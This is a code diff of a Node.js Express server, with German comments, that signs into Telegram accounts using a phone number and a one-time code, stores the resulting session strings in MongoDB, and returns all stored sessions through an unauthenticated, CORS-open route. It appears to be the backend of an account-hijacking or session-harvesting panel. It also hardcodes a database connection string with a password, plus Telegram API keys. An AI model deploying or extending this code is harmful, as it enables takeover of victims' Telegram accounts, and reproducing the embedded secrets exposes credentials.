@@ -1,57 +1,63 @@
 const express = require('express');
 const cors = require('cors');
 const mongoose = require('mongoose');
-const { TelegramClient } = require('telegram');
+const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// 1. MONGODB Verbindung (Setz hier deinen Connection String ein!)
+// MongoDB Verbindung
 const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
-mongoose.connect(MONGO_URI);
+mongoose.connect(MONGO_URI).then(() => console.log("DB connected")).catch(err => console.error(err));
 
-const SessionSchema = new mongoose.Schema({ phone: String, session: String });
+const SessionSchema = new mongoose.Schema({ phone: String, session: String, status: String });
 const SessionModel = mongoose.model('Session', SessionSchema);
 
-// 2. Telegram Konfig
-const apiId = 23049703;
-const apiHash = 'e9c00af578a9de0253ef02337460498f';
-let client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
-let phoneCodeHash = '';
+// In-Memory Speicher für temporäre Auth-Daten
+let authState = {};
 
-// 3. Routen
 app.post('/send-otp', async (req, res) => {
+    const { phone, apiId, apiHash } = req.body;
     try {
-        const { phoneNumber } = req.body;
+        const client = new TelegramClient(new StringSession(""), parseInt(apiId), apiHash, { connectionRetries: 5 });
         await client.connect();
-        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
-        phoneCodeHash = result.phoneCodeHash;
-        res.json({ success: true });
-    } catch (e) { res.status(400).json({ error: e.message }); }
+        const { phoneCodeHash } = await client.sendCode({ apiId: parseInt(apiId), apiHash }, phone);
+        authState[phone] = { phoneCodeHash, client };
+        res.json({ success: true, phoneCodeHash });
+    } catch (err) {
+        res.status(400).json({ error: err.message });
+    }
 });
 
 app.post('/verify-otp', async (req, res) => {
+    const { phone, code, phoneCodeHash } = req.body;
+    const state = authState[phone];
+    if (!state) return res.status(400).json({ error: "No session found" });
     try {
-        const { phoneNumber, code } = req.body;
-        await client.signIn({ apiId, apiHash, phoneNumber, phoneCodeHash, phoneCode: code });
-        const sessionString = client.session.save();
-        
-        // Speichere in MongoDB
-        await SessionModel.create({ phone: phoneNumber, session: sessionString });
-        
-        res.json({ success: true, session: sessionString });
-    } catch (e) { res.status(400).json({ error: e.message }); }
+        await state.client.signIn({
+            apiId: state.client.apiId,
+            apiHash: state.client.apiHash,
+            phoneNumber: phone,
+            phoneCode: code,
+            phoneCodeHash: phoneCodeHash
+        });
+        const sessionString = state.client.session.save();
+        await SessionModel.create({ phone, session: sessionString, status: "Active" });
+        res.json({ success: true });
+    } catch (err) {
+        res.status(400).json({ error: err.message });
+    }
 });
 
-// NEU: Diese Route hat dir gefehlt (404-Fix)
 app.get('/get-sessions', async (req, res) => {
     try {
         const sessions = await SessionModel.find();
         res.json(sessions);
-    } catch (e) { res.status(500).json({ error: e.message }); }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server läuft auf ${PORT}`));
+app.listen(3000, () => console.log("Server running on port 3000"));
